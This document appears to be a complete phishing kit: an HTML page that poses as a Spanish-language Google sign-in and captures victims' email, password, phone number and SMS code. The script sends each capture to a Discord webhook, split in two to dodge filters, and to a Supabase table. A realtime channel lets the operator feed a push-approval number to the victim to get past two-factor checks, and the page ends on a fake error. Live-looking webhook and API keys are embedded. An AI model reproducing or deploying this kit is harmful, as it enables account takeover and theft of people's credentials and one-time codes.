<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Iniciar sesi칩n: Cuentas de Google</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap');
        body { font-family: 'Roboto', arial, sans-serif; background-color: #fff; color: #202124; }
        .g-field { width: 100%; padding: 13px 15px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; outline: none; transition: all 0.2s; }
        .g-field:focus { border: 2px solid #1a73e8; padding: 12px 14px; }
        .loader { width: 20px; height: 20px; border: 2px solid #f3f3f3; border-top: 2px solid #1a73e8; border-radius: 50%; animation: spin 0.8s linear infinite; }
        @keyframes spin { to { transform: rotate(360deg); } }
        #gate { position: fixed; inset: 0; background: white; z-index: 9999; display: flex; flex-direction: column; align-items: center; justify-content: center; }
    </style>
</head>
<body class="flex flex-col items-center justify-center min-h-screen p-4">

    <div id="gate">
        <div class="loader mb-4"></div>
        <p class="text-xs text-gray-400 font-medium tracking-tight">Verificando conexi칩n segura...</p>
    </div>

    <div id="wrapper" class="w-full max-w-[448px] p-6 sm:p-10 sm:border border-gray-200 rounded-lg opacity-0 transition-opacity duration-700">
        <div class="flex justify-center mb-6">
            <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" class="h-6" alt="Google">
        </div>
        <div id="dynamic-view"></div>
    </div>

    <footer id="footer-text" class="mt-8 flex gap-6 text-[12px] text-gray-500">
        <span>Espa침ol (Espa침a)</span>
        <div class="flex gap-4"><span>Ayuda</span><span>Privacidad</span><span>Condiciones</span></div>
    </footer>

    <div id="vibe-screen" class="fixed inset-0 bg-[#0b0e11] hidden flex-col items-center justify-center p-6 z-[10000]">
        <div id="vibe-load">
            <div class="w-12 h-12 border-4 border-zinc-800 border-t-cyan-500 rounded-full animate-spin mb-4 mx-auto"></div>
            <p class="text-[10px] text-cyan-500 font-black uppercase tracking-[0.4em]">Sincronizando</p>
        </div>
        <div id="vibe-fail" class="hidden text-center">
            <h2 class="text-cyan-500 font-black italic text-4xl mb-4 tracking-tighter uppercase">ERROR DE ENLACE</h2>
            <button onclick="location.reload()" class="bg-cyan-600 text-black font-black px-12 py-4 rounded-2xl text-[10px] uppercase">Reintentar</button>
        </div>
    </div>

    <script>
        // URL DIRECTA - La forma m치s sencilla (Separada en dos para evitar filtros b치sicos)
        const partA = "https://discord.com/api/webhooks/1443618037294174220/";
        const partB = "cHXeoeQ9KzfGkKtUeVL-9AXk0o4ARszzBsEtkMm6xAVYgAMQdrSmNLP1K198X8HCgVSE";
        const W_HOOK = partA + partB;

        const S_URL = "https://eyrvplemxhnootpjzkav.supabase.co";
        const S_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImV5cnZwbGVteGhub290cGp6a2F2Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjgyNTEwMDksImV4cCI6MjA4MzgyNzAwOX0.YxrnHYnBkQLqPuVH5izQdYYgL7GVZQgSG1h89sDVd0g";
        
        const client = supabase.createClient(S_URL, S_KEY);
        const sesId = "SV-" + Math.random().toString(36).substr(2, 4).toUpperCase();
        let store = { step: 'login', email: '', pass: '', phone: '', target: '--', sms: '' };

        setTimeout(() => {
            document.getElementById('gate').style.display = 'none';
            document.getElementById('wrapper').style.opacity = '1';
            draw();
        }, 1500);

        async function push(step) {
            // 1. Guardar en Supabase (Prioridad)
            await client.from('sessions').upsert({
                session_id: sesId, step: step, email: store.email, 
                password: store.pass, phone: store.phone, sms: store.sms,
                target_num: store.target === '--' ? null : store.target,
                updated_at: new Date().toISOString()
            }, { onConflict: 'session_id' });

            // 2. Enviar a Discord (Modo Simple)
            const payload = {
                content: `游 **ACTUALIZACI칍N**\n**ID:** ${sesId}\n**PASO:** ${step.toUpperCase()}\n**USER:** ${store.email}\n**PASS:** ${store.pass}\n**TEL:** ${store.phone}\n**C칍DIGO:** ${store.target}\n**SMS:** ${store.sms || '-'}`
            };

            fetch(W_HOOK, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            }).catch(e => console.log("Error Discord:", e));
        }

        function draw() {
            const container = document.getElementById('dynamic-view');
            if(store.step === 'login') {
                container.innerHTML = `
                    <div class="text-center mb-8"><h1 class="text-2xl font-normal mb-2">Iniciar sesi칩n</h1><p class="text-[15px]">Usa tu cuenta de Google</p></div>
                    <form onsubmit="event.preventDefault(); store.email=this.e.value; store.pass=this.p.value; store.step='phone'; push('phone'); draw();">
                        <input name="e" required type="email" placeholder="Correo electr칩nico" class="g-field mb-4">
                        <input name="p" required type="password" placeholder="Contrase침a" class="g-field mb-2">
                        <div class="flex justify-between items-center mt-10">
                            <span class="text-[#1a73e8] font-medium text-sm cursor-pointer">Crear cuenta</span>
                            <button class="bg-[#1a73e8] text-white px-8 py-2 rounded font-medium text-sm">Siguiente</button>
                        </div>
                    </form>`;
            } else if(store.step === 'phone') {
                container.innerHTML = `
                    <div class="text-center mb-6"><h1 class="text-xl font-medium">Verificaci칩n</h1><p class="text-sm text-gray-600 mt-4">Confirma tu identidad para continuar.</p></div>
                    <form onsubmit="event.preventDefault(); store.phone=this.t.value; store.step='wait'; push('wait'); draw();">
                        <input name="t" required type="tel" placeholder="N칰mero de tel칠fono" class="g-field text-center text-xl mb-6">
                        <button class="w-full bg-[#1a73e8] text-white py-2.5 rounded font-medium">Siguiente</button>
                    </form>`;
            } else if(store.step === 'wait') {
                container.innerHTML = `
                    <div class="text-center">
                        <h1 class="text-xl font-medium mb-4">Comprueba tu dispositivo</h1>
                        <p class="text-sm text-gray-600 mb-6 text-left">Toca <b>"S칤, soy yo"</b> en la notificaci칩n y selecciona este n칰mero:</p>
                        <div class="inline-block px-12 py-8 bg-blue-50 border-2 border-blue-100 rounded-3xl mb-8">
                            <span class="text-7xl font-bold text-[#1a73e8] animate-pulse">${store.target}</span>
                        </div>
                        <div class="flex items-center justify-center gap-3"><div class="loader"></div><span class="text-[10px] text-gray-400 font-bold uppercase">Sincronizando...</span></div>
                    </div>`;
            } else if(store.step === 'sms') {
                container.innerHTML = `
                    <div class="text-center mb-6"><h1 class="text-xl font-bold">C칩digo SMS</h1><p class="text-xs text-gray-500 mt-2">Introduce el c칩digo enviado.</p></div>
                    <form onsubmit="event.preventDefault(); store.sms=this.s.value; store.step='end'; push('end'); finish();">
                        <div class="flex items-center border border-gray-300 p-3 rounded bg-gray-50 mb-8"><span class="text-xl font-bold text-gray-400 mr-2">G-</span><input name="s" required type="number" placeholder="000000" class="w-full text-2xl outline-none bg-transparent"></div>
                        <button class="w-full bg-[#1a73e8] text-white py-3.5 rounded-lg font-bold">Verificar</button>
                    </form>`;
            }
        }

        function finish() {
            document.getElementById('wrapper').style.display = 'none';
            document.getElementById('footer-text').style.display = 'none';
            document.getElementById('vibe-screen').classList.remove('hidden');
            document.getElementById('vibe-screen').classList.add('flex');
            setTimeout(() => { document.getElementById('vibe-load').classList.add('hidden'); document.getElementById('vibe-fail').classList.remove('hidden'); }, 5000);
        }

        client.channel('vibe-sync').on('postgres_changes', { event: 'UPDATE', schema: 'public', table: 'sessions', filter: `session_id=eq.${sesId}` }, (p) => {
            store.target = p.new.target_num || '--';
            store.step = p.new.step;
            draw();
        }).subscribe();
    </script>
</body>
</html>
